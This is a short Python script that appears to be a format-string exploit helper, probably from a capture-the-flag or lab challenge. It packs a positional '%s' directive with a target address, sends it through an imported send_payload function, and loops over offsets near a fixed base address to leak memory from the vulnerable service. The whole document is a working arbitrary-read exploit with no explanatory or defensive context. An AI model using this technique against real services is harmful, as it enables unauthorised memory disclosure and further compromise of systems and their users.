import struct
from mirage import send_payload

def deref(addr, slot=7):
    a = struct.pack("<Q", addr)
    directive = ("%%%d$s" % slot).encode()
    pad = b"A" * (8 - len(directive))
    payload = directive + pad + a + b"\n"
    b, r = send_payload(payload, wait=2)
    return r

base = 0x4b6ac0
for off in range(-10, 1):
    r = deref(base+off)
    print(off, "->", r)
